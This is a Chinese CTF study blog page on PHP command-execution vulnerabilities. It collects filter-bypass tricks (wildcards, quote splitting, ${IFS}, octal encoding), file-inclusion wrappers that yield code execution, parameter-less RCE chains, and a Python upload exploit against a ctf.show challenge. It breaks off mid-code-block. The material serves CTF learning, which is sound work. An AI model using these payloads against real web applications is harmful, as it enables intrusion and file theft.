@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一、什么是命令执行？ \u200b 命令执行漏洞指的是网站的应用程序有些需要调用执行系统命令，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正">
+<title>命令执行</title>
+
+<link rel='canonical' href='https://liernian.github.ioS/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="命令执行">
+<meta property='og:description' content="一、什么是命令执行？ \u200b 命令执行漏洞指的是网站的应用程序有些需要调用执行系统命令，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正">
+<meta property='og:url' content='https://liernian.github.ioS/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-02-26T14:31:23&#43;08:00'/><meta property='article:modified_time' content='2025-02-26T14:31:23&#43;08:00'/>
+<meta name="twitter:title" content="命令执行">
+<meta name="twitter:description" content="一、什么是命令执行？ \u200b 命令执行漏洞指的是网站的应用程序有些需要调用执行系统命令，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://liernian.github.ioS/en/" >English</option>
+                                
+                                    <option value="https://liernian.github.ioS/" selected>简体中文</option>
+                                
+                                    <option value="https://liernian.github.ioS/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#heading"></a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#可读取目录的命令函数">可读取目录的命令/函数</a></li>
+    <li><a href="#可读取文件的命令函数">可读取文件的命令/函数</a></li>
+    <li><a href="#绕过手法">绕过手法</a>
+      <ol>
+        <li><a href="#通配符绕过">通配符绕过</a></li>
+        <li><a href="#关键词拼接">关键词拼接</a></li>
+        <li><a href="#空格绕过">空格绕过</a></li>
+        <li><a href="#后续代码绕过">后续代码绕过</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#文件包含">文件包含</a>
+      <ol>
+        <li><a href="#文件包含函数漏洞">文件包含函数漏洞</a></li>
+        <li><a href="#文件包含伪协议">文件包含伪协议</a></li>
+      </ol>
+    </li>
+    <li><a href="#无参数rce">无参数rce</a></li>
+    <li><a href="#mv改名grep">mv改名/grep</a></li>
+    <li><a href="#ascii码替代字母">Ascii码替代字母</a></li>
+    <li><a href="#炫技10">炫技1.0</a></li>
+    <li><a href="#炫技20">炫技2.0</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-02-26</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="heading">
+</h2><blockquote>
+<h1 id="一什么是命令执行">一、什么是命令执行？
+</h1></blockquote>
+<p>​    命令执行漏洞指的是网站的应用程序有些需要<strong>调用执行系统命令</strong>，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
+<p>​    命令执行，执行的有两种命令，一种是搭建网站的Linux系统命令，一个是php自身的函数</p>
+<p>​    对于一道与命令执行相关的题目，重要的是找到什么<strong>函数/命令</strong>可以用，怎么用，用来干什么。</p>
+<p>​    接下来会详细归纳一下怎么做命令执行的题目</p>
+<hr>
+<blockquote>
+<h1 id="二可用函数命令与绕过手法"><strong>二、可用函数/命令与绕过手法</strong>
+</h1></blockquote>
+<p>​    flag以文件的形式藏在网页目录中，我们需要</p>
+<p>​    **1.**找到flag文件的位置</p>
+<p>​    **2.**读取它</p>
+<p>在php中可以执行Linux命令的常见函数有：</p>
+<p>​    system()、passthru()、exec()、shell_exec()、pcntl_exec()、popen()、proc_open()</p>
+<p>在php中可以执行代码的常见函数有：</p>
+<p>​    eval()、assert()、preg_replace()、$</p>
+<p>​    当一道题目中出现了eval()等函数之后，我们便可以控制eval()函数的参数，从而让网站执行我们想要执行的命令。</p>
+<p>​    前面说了，我们需要找到flag文件的位置，需要读取它。所以，我们还需要一些Linux命令和php函数。</p>
+<hr>
+<h2 id="可读取目录的命令函数">可读取目录的命令/函数
+</h2><p>​    ls <strong>（一般也只用ls）</strong></p>
+<p>​    ll：是 ls -l 的缩写，可以显示文件的详细信息，包括权限、所有者、大小、时间戳 等。</p>
+<p>​    la：是 ls -a 的缩写，可以显示所有文件，包括隐藏文件。</p>
+<p>​    tree：可以以树形结构显示目录和文件，更加直观。</p>
+<p>​    dir</p>
+<p>​    echo /* : 可以读目录的（根目录）</p>
+<p>​    exa：是一个比 ls 更加现代化的替代品，支持彩色输出、Git 状态标记、更好的排序 和过滤等功能。</p>
+<p>​    vdir：和 ls 类似，但是可以按照文件修改时间进行排序。</p>
+<p>​    lsd：只显示目录，不显示文件，适合查看目录结构。</p>
+<p>​    print_r(glob(&quot;<em>&quot;)); // 读取当前目录
+​     print_r(glob(&quot;/</em>&quot;)); // 列根目录
+​     var_dump(scandir(chr(47))) 等同于 system(&ldquo;ls /&rdquo;) // (空格，引号被过滤的话，可以替代)
+​     print_r(scandir(&rsquo;.&rsquo;)); // 访问当前目录
+​     print_r(scandir(&quot;/&quot;)); //打印一下根目录</p>
+<p>​    $d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;}
+​     $d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;}
+​     $a=glob(&quot;/<em>&quot;);foreach($a as $value){echo $value.&quot;  &ldquo;;}
+​     $a=new DirectoryIterator(&lsquo;glob:///</em>&rsquo;);foreach($a as $f){echo($f-&gt;__toString().&rdquo; &ldquo;);}（根目录）</p>
+<hr>
+<h2 id="可读取文件的命令函数">可读取文件的命令/函数
+</h2><p>​    cat: 读取文件内容</p>
+<p>​    sort: 可以读取文件内容</p>
+<p>​    less：可以分页显示文件内容，并且支持上下翻页、搜索等操作，适合查看较长的文件 内容。</p>
+<p>​    more：和 less 类似，也可以分页显示文件内容，但是功能比 less 简单。</p>
+<p>​    head：可以显示文件的前几行，默认显示前 10 行。</p>
+<p>​    tail：可以显示文件的后几行，默认显示后 10 行。</p>
+<p>​    nl：可以显示文件的行号，并且可以自定义行号的格式。</p>
+<p>​    grep：可以在文件中查找指定的字符串，支持正则表达式，适合查找特定内容。</p>
+<p>​    awk：可以对文件进行逐行处理和分析，支持多种操作和模式匹配。</p>
+<p>​    tac：和 cat 相反，可以倒序显示文件的内容。</p>
+<p>​    paste：可以将多个文件按列合并，适合处理数据表格。</p>
+<p>​    sed：可以对文件进行逐行处理和替换，支持正则表达式，适合批量修改文本。</p>
+<p>​    1tr：可以对文件中的字符进行替换和删除等操作，适合批量修改字符集。</p>
+<p>​    hexdump：可以以十六进制的形式显示文件的 内容，并且可以查看文件的二进制格式。</p>
+<p>​    od：可以以八进制或十六进制的形式显示文件的内容，并且可以查看文件的二进制格 式。</p>
+<p>​    pr：可以将文件进行格式化和分页处理，适合打印或排版文本。</p>
+<p>​    fold：可以将长行文本进行折行处理，便于查看和编辑。</p>
+<p>​    highlight_file();</p>
+<p>​    show_source();</p>
+<p>​    file_get_contents();</p>
+<p>​    readfile();</p>
+<p>​    include($filename);</p>
+<p>​    include_once($filename);</p>
+<p>​    require($filename);</p>
+<p>​    require_once($filename);</p>
+<hr>
+<h2 id="绕过手法">绕过手法
+</h2><p>​    命令执行，需要严格的过滤，这类题目里会用preg_match()函数正则匹配实现过滤</p>
+<p>如果把你需要用到命令/函数/flag给过滤了该怎么办呢</p>
+<p>​    1.可以换个函数用（bushi）</p>
+<p>​    2.使用传说中的绕过手法</p>
+<h3 id="通配符绕过">通配符绕过
+</h3><p>题目把flag过滤了怎么办，无法读取flag，那么可以用通配符匹配绕过</p>
+<p>​    flag</p>
+<p>​    cat flag</p>
+<p>​    cat f???</p>
+<p>​    cat f*                                                                       用&rdquo;[!]&ldquo;来替换通配符&rdquo;?&quot;</p>
+<p>​    &ldquo;[!q]&ldquo;表示匹配非q的字符</p>
+<p>​    *: 表示匹配一个或多个</p>
+<p>​    也用 [^x] 的方法来表示 “这个位置不是字符x”</p>
+<p>​    可见大写字母位于 @ 与 [ 之间, 可以利用 [@-[] 来表示大写字母</p>
+<h3 id="关键词拼接">关键词拼接
+</h3><p>tac等读取命令被ban了怎么办？可以用关键词拼接</p>
+<p>​    \ : 比如ls 被过滤了, 可以使用 l\s 执行命令</p>
+<p>​    &quot;&rdquo; 或者 &rsquo; &rsquo; : 同理: l&rsquo;&rsquo;s 和 l&quot;&ldquo;s</p>
+<p>​    $@ : 同理 l$@s</p>
+<h3 id="空格绕过">空格绕过
+</h3><p>空格都要ban，真是crazy</p>
+<p>​    %20 ：空格url编码</p>
+<p>​    %0d：回车的url</p>
+<p>​    %0a：换行的url</p>
+<p>​    %09 ：Tab 的url</p>
+<p>​    &lt;</p>
+<p>​    &lt;&gt;</p>
+<p>​    ${IFS}</p>
+<p>​    $IFS$1</p>
+<h3 id="后续代码绕过">后续代码绕过
+</h3><p>构造的pyload后面加一个exit();</p>
+<p>过滤掉eval()后面的会影响回响的代码。</p>
+<p>（详情可见web71<a class="link" href="https://blog.csdn.net/Takagiapa/article/details/143856042?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=143856042&amp;sharerefer=PC&amp;sharesource=Takagiapa&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >ctfshow_web67-77_命令执行-CSDN博客</a>）</p>
+<hr>
+<blockquote>
+<h1 id="三特殊手法">三、特殊手法
+</h1></blockquote>
+<p>以上这些知识点可以解决很多题目了，接下来是一些特殊手法</p>
+<h2 id="文件包含">文件包含
+</h2><p>准确来说，文件包含并不属于命令执行的范畴，不过ctfshow命令执行里出现了需要文件包含的题目，这里就一起带过了</p>
+<h3 id="文件包含函数漏洞">文件包含函数漏洞
+</h3><p>（偷个懒，把我之前写的复制粘贴一下QAQ）</p>
+<p>​    1.require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
+<p>​    2.include()，找不到被包含的文件时只会产生警告，脚本将继续运行</p>
+<p>​    3.highlight_file()</p>
+<p>​    <strong>这里简单来说就是遇到require()函数和include()函数时，可能会触发文件包含的漏洞，具体通过一些伪协议进行包含</strong></p>
+<h3 id="文件包含伪协议">文件包含伪协议
+</h3><p>​    file:// [文件的绝对路径和文件名]
+​     php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了
+​     php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<p>​    zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行
+​     data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>​    data://text/plain/,<?php ‘代码’?></p>
+<p>（详情可见）</p>
+<hr>
+<h2 id="无参数rce">无参数rce
+</h2><p>​    当过滤几乎把所有标点符号都ban了但是没过滤()的时候，就涉及到无参数rce</p>
+<p>​    （同样偷个懒，复制粘贴一下）</p>
+<p>​    print_r(scandir()) 查看当前目录下的所有文件名</p>
+<p>​    current()  数返回数组中的当前元素（单元）,默认取第一个值可以代替pos();</p>
+<p>​    localeconv()  函数返回一包含本地数字及货币格式信息的数组（其实结果就是  .  是为了上面查看当前目录的）</p>
+<p>​    也可以用getcwd() 返回当前工作目录(代替pos(localeconv());)</p>
+<p><strong>所以print_r(scandir(current(localeconv())));//print_r(scandir(getcwd()));就是查看当前目录</strong></p>
+<p>怎么读取呢？</p>
+<p>​    array_reverse()顾名思义，数组倒置。</p>
+<p>​    next() 将数组中的内部指针向前移动一位（这里倒置之后移动就正好是flag.php的位置）</p>
+<p>​    show_source() 展示源码</p>
+<p>​    然后通过指针的移动展示flag所在文件的源码</p>
+<p>（详情见web40<a class="link" href="https://blog.csdn.net/Takagiapa/article/details/143493819?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=143493819&amp;sharerefer=PC&amp;sharesource=Takagiapa&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >ctfshow40-55 命令执行-CSDN博客</a>）</p>
+<hr>
+<h2 id="mv改名grep">mv改名/grep
+</h2><p>.php文件在网页中通常是不显示的。</p>
+<p>有些题目读取了flag.php之后可以得到flag是因为flag.php中有输出flag的代码</p>
+<p>那么如果读取flag.php之后没有显示出flag该怎么办呢</p>
+<p>1.可以用grep命令在flag.php中读取</p>
+<p>2.通过mv改名，把.php文件改名伪.txt文件</p>
+<p>grep flag flag.php（在flag.php中匹配有flag的字符串并输出）</p>
+<p>mv flag.php a.txt</p>
+<p>（详情见web54<a class="link" href="https://blog.csdn.net/Takagiapa/article/details/143493819?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=143493819&amp;sharerefer=PC&amp;sharesource=Takagiapa&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >ctfshow40-55 命令执行-CSDN博客</a>）</p>
+<hr>
+<h2 id="ascii码替代字母">Ascii码替代字母
+</h2><p>首先，在终端中，<code>$'\xxx'</code>可以将八进制ascii码解析为字符</p>
+<p>在题目中ban了所有字母时，就可以用这个方式来执行命令</p>
+<p>例：$%27\154\163%27</p>
+<p>%27是 '</p>
+<p>154八进制转换为十进制转化为Ascii码为l</p>
+<p>163是s</p>
+<p>所以这个命令就是 ls</p>
+<hr>
+<h2 id="炫技10">炫技1.0
+</h2><p>偷个懒，截一下之前的图</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/e97a1aabe6d147deb9f9e1ebe6ff01dd.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+>编辑</p>
+<p>​    这里再给个原码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://7ddc2667-c299-4a6f-824d-29746a045d38.challenge.ctf.show/?c=.+/???/????????[@-[]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">r</span> <span class="o">=</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;feng.txt&#39;</span><span class="p">,</span> <span class="nx">b</span><span class="s1">&#39;cat flag.php&#39;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">r</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">find</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">print</span><span class="p">(</span><span class="nx">r</span><span class="o">.</span><span class="nx">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<hr>
+<h2 id="炫技20">炫技2.0
+</h2><p>当网站目录被open_basedir和disable_function限制了，也就是无法打开open_basedir锁定树之外的文件也无法用disable_function函数ban掉的函数时</p>
+<p>可以用开源脚本进行绕过（原理我也不懂）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
